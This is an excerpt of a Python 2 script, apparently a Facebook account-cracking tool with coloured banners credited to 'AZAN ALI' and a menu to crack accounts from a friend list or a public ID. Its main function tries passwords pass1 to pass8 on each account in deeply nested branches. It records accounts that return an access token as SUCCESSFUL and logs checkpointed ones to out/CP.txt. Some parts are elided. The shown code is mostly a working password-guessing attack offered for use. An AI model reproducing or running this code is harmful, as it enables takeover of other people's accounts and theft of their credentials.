...
\33[38;1mMTLAB KUCH B
\33[38;1mLoaded....100%
\033[0;35m[\033[0;92m •• \033[0;35m] Author   : AZAN ALI
...
\33[31;1m🅿🅰🅺🅸🆂🆃🅰🅽 🆉🅸🅽🅳🅰🅱🅰🅳
\33[31;1mALONE BUT HAPPY
\33[31;1mC͎H͎A͎N͎N͎E͎L͎ ͎N͎A͎M͎E͎=͎ ͎GUJJAR ͎M͎A͎S͎T͎E͎R͎
\33[31;1mLOADING........
\033[0;39m[\033[0;92m •• \033[0;39m] Author   : AZAN ALI
\033[1;39m\033[1;41;39mヅ︻写፨丐יי一一一 ҉ ㄹㅇㄹ1 \033[0m
\033[0;39m~~~~~~~~~~~~~~~~~~~~~~~~~~~"""
print("\033[0;92mUsername/Password: AZAN X.")
print("\033[0;39m~~~~~~~~~~~~~~~~~~~~~~~~~~~")

CorrectUsername = "AZAN X."
...
def menu():
	...
	print "   \033[0;39;40m ╚═════════════════════════════════╝"
	print "\033[0;32;39m1. \033[0;33;39mStart Cracking"	
...
def super():
	...
	print logo
	print "\x1b ╔═════════════════════════╗"
	print "\x1b ║1. Crack From Friend List ║"
	print "\x1b ║2. Crack From Public ID   ║"
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\033[0;92m[SUCCESSFUL] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass1 + '\033[0;39m | \033[0;39m' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[0;36;39[CHECKPOINT] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass1 + '\033[0;39m | \033[0;39m' + b['name']
					...
					q = json.load(data)
					if 'access_token' in q:
						print '\033[0;91m[SUCCESSFUL] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass2 + '\033[0;39m | \033[0;39m' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[0;36;39[CHECKPOINT] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass2 + '\033[0;39m | \033[0;39m' + b['name']
							cek = open("out/CP.txt", "a")
							...
							q = json.load(data)
							if 'access_token' in q:
								print '\033[0;92m[SUCCESSFUL] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass3 + '\033[0;39m | \033[0;39m' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[0;91;39[CHECKPOINT] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass3 + '\033[0;39m | \033[0;39m' + b['name']
									cek = open("out/CP.txt", "a")
									...
									q = json.load(data)
									if 'access_token' in q:
										print '\033[0;92m[SUCCESSFUL] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass4 + '\033[0;39m | \033[0;39m' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[0;91;39[CHECKPOINT] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass4 + '\033[0;39m | \033[0;39m' + b['name']
											cek = open("out/CP.txt", "a")
											...
											q = json.load(data)
											if 'access_token' in q:
												print '\033[0;92m[SUCCESSFUL] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass5 + '\033[0;39m | \033[0;39m' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[0;91;39[CHECKPOINT] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass5 + '\033[0;39m | \033[0;39m' + b['name']
													cek = open("out/CP.txt", "a")
													...
													q = json.load(data)
													if 'access_token' in q:
														print '\033[0;92m[SUCCESSFUL] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass6 + '\033[0;39m | \033[0;39m' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[0;91;39[CHECKPOINT] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass6 + '\033[0;39m | \033[0;39m' + b['name']
															cek = open("out/CP.txt", "a")
															...
															q = json.load(data)
															if 'access_token' in q:
																print '\033[0;92m[SUCCESSFUL] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass7 + '\033[0;39m | \033[0;39m' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[0;91;39[CHECKPOINT] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass7 + '\033[0;39m | \033[0;39m' + b['name']
																	cek = open("out/CP.txt", "a")
																	...
																	q = json.load(data)
																	if 'access_token' in q:
																		print '\033[0;92m[SUCCESSFUL] \033[0;39m '+ user + ' \x1b[0;36;39|\033[0;39m ' + pass8 + '\033[0;39m | \033[0;39m' + b['name']
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in q["error_msg"]:
																			print '\x1b[0;91;39[CHECKPOINT] \033[0;39m ' + user + '\x1b[0;36;39|\033[0;39m ' + pass8 + '\033[0;39m | \033[0;39m' + b['name']
																			cek = open("out/CP.txt", "a")
																			cek.close()
